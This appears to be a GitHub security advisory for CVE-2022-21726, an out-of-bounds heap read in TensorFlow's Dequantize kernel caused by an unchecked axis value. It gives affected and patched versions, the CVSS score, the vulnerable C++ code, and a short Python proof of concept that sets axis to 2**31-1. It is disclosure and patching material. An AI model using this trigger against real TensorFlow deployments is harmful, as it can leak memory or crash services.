{
    "Title": "Out of bounds read in Tensorflow",
    "Meta": {
        "Package": [
            "tensorflow([pip](/advisories?query=ecosystem%3Apip))"
        ],
        "Affected versions": [
            "< 2.5.3",
            ">= 2.6.0, < 2.6.3",
            "= 2.7.0"
        ],
        "Patched versions": [
            "2.5.3",
            "2.6.3",
            "2.7.1"
        ]
    },
    "Description": "### Impact\n\nThe [implementation of\n`Dequantize`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/dequantize_op.cc#L92-L153)\ndoes not fully validate the value of `axis` and can result in heap OOB\naccesses:\n\n    \n    \n    import tensorflow as tf\n    \n    @tf.function\n    def test():\n      y = tf.raw_ops.Dequantize(\n        input=tf.constant([1,1],dtype=tf.qint32),\n        min_range=[1.0],\n        max_range=[10.0],\n        mode='MIN_COMBINED',\n        narrow_range=False,\n        axis=2**31-1,\n        dtype=tf.bfloat16)\n      return y\n    \n    test()\n\nThe `axis` argument can be `-1` (the default value for the optional argument)\nor any other positive value at most the number of dimensions of the input.\nUnfortunately, the upper bound is not checked and this results in reading past\nthe end of the array containing the dimensions of the input tensor:\n\n    \n    \n      if (axis_ > -1) {\n        num_slices = input.dim_size(axis_);\n      }\n      // ...\n      int64_t pre_dim = 1, post_dim = 1;\n      for (int i = 0; i < axis_; ++i) {\n        pre_dim *= float_output.dim_size(i);\n      }\n      for (int i = axis_ + 1; i < float_output.dims(); ++i) {\n        post_dim *= float_output.dim_size(i);\n      }\n\n### Patches\n\nWe have patched the issue in GitHub commit\n[23968a8bf65b009120c43b5ebcceaf52dbc9e943](https://github.com/tensorflow/tensorflow/commit/23968a8bf65b009120c43b5ebcceaf52dbc9e943).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this\ncommit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these\nare also affected and still in supported range.\n\n### For more information\n\nPlease consult [our security\nguide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for\nmore information regarding the security model and how to contact us with\nissues and questions.\n\n### Attribution\n\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.\n\n### References\n\n  * [GHSA-23hm-7w47-xw72](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-23hm-7w47-xw72 \"GHSA-23hm-7w47-xw72\")\n  * [tensorflow/tensorflow@`23968a8`](https://github.com/tensorflow/tensorflow/commit/23968a8bf65b009120c43b5ebcceaf52dbc9e943)\n  * <https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/dequantize_op.cc#L92-L153>\n  * <https://nvd.nist.gov/vuln/detail/CVE-2022-21726>\n\n",
    "Severity": {
        "Score": "8.1/ 10 (High)",
        "CVSS base metrics": {
            "Attack vector": "Network",
            "Attack complexity": "Low",
            "Privileges required": "Low",
            "User interaction": "None",
            "Scope": "Unchanged",
            "Confidentiality": "High",
            "Integrity": "None",
            "Availability": "High"
        },
        "CVSS string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H"
    },
    "Weaknesses": [
        "[CWE-125](/advisories?query=cwe%3A125)"
    ],
    "CVE ID": "CVE-2022-21726",
    "GHSA ID": "GHSA-23hm-7w47-xw72",
    "Source code": "[tensorflow/tensorflow/](https://github.com/tensorflow/tensorflow/)"
}